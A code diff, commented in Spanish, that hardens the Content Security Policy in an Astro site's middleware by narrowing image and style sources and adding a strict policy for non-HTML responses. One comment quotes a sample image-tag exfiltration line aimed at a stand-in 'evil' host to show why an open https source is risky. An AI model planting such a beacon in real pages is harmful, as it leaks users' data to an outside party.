@@ -1,5 +1,6 @@
 import { defineMiddleware } from 'astro:middleware';
 import { AUTH_CONFIGURADA, crearClienteUsuario, tieneCookieSesion, urlEntrar } from '@lib/auth/servidor';
+import { ORIGENES_IMAGEN } from '@lib/cdn';
 
 // Rutas que exigen sesión, y las que además exigen rol de administrador.
 const PRIVADAS = ['/cuenta'];
@@ -69,11 +70,47 @@ export const onRequest = defineMiddleware(async (context, next) => {
   return respuesta;
 });
 
-// Cabeceras de seguridad para todo el sitio. La CSP solo tiene sentido en los
-// documentos HTML (usa el nonce de sus scripts inline); el resto de cabeceras
-// aplica a toda respuesta. `script-src` no lleva `'unsafe-inline'`: los dos
-// scripts inline del layout van con nonce y el resto los empaqueta Astro como
-// `'self'`, así que un `</script>` inyectado no se ejecutaría.
+/**
+ * CSP de un documento HTML.
+ *
+ * `script-src` no lleva `'unsafe-inline'`: los scripts inline del layout van con
+ * nonce y el resto los empaqueta Astro como `'self'`, así que un `</script>`
+ * inyectado no se ejecutaría.
+ *
+ * En desarrollo Vite sirve el CSS en un `<style>` inyectado que no se puede
+ * noncear, así que ahí —y solo ahí— `style-src` admite inline. En producción las
+ * hojas van todas como archivo (`inlineStylesheets: 'never'`), de modo que un
+ * `<style>` inyectado —exfiltración por CSS, desfiguración— no se aplica.
+ */
+export function cspDocumento(nonce: string, dev = false): string {
+  return [
+    "default-src 'self'",
+    `script-src 'self' 'nonce-${nonce}'`,
+    dev ? "style-src 'self' 'unsafe-inline'" : "style-src 'self'",
+    // Los `style=` con valores calculados de /dashboard, /mercado y /marcas no
+    // admiten nonce por especificación, así que el atributo queda abierto aunque
+    // la hoja no lo esté.
+    "style-src-attr 'unsafe-inline'",
+    // Solo los orígenes desde los que el sitio sirve fotos; `data:` para los SVG
+    // inline. Un `https:` abierto es un canal de exfiltración clásico
+    // (`<img src="https://evil/?d=...">`).
+    ["img-src 'self' data:", ...ORIGENES_IMAGEN].join(' '),
+    "connect-src 'self'",
+    "font-src 'self'",
+    "frame-ancestors 'none'",
+    "base-uri 'self'",
+    "form-action 'self'",
+    "object-src 'none'",
+  ].join('; ');
+}
+
+/**
+ * CSP de lo que no es un documento (sitemap, endpoints): no carga nada ni se
+ * enmarca. Sin esto eran la única familia de respuestas del sitio sin política.
+ */
+export const CSP_NO_DOCUMENTO = "default-src 'none'; frame-ancestors 'none'; base-uri 'none'";
+
+// Cabeceras de seguridad para todo el sitio.
 function aplicarCabecerasSeguridad(respuesta: Response, esHtml: boolean, nonce: string): void {
   const h = respuesta.headers;
   h.set('X-Content-Type-Options', 'nosniff');
@@ -83,23 +120,8 @@ function aplicarCabecerasSeguridad(respuesta: Response, esHtml: boolean, nonce: 
     h.set('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
   }
 
-  if (!esHtml) return;
   h.set(
     'Content-Security-Policy',
-    [
-      "default-src 'self'",
-      `script-src 'self' 'nonce-${nonce}'`,
-      // Tailwind y algún atributo `style` puntual; `script-src` es lo que audita
-      // Lighthouse y ahí no hay `'unsafe-inline'`.
-      "style-src 'self' 'unsafe-inline'",
-      // Fotos servidas desde R2/CDN y las og:image; `data:` para SVG inline.
-      "img-src 'self' data: https:",
-      "connect-src 'self'",
-      "font-src 'self'",
-      "frame-ancestors 'none'",
-      "base-uri 'self'",
-      "form-action 'self'",
-      "object-src 'none'",
-    ].join('; '),
+    esHtml ? cspDocumento(nonce, import.meta.env.DEV) : CSP_NO_DOCUMENTO,
   );
 }
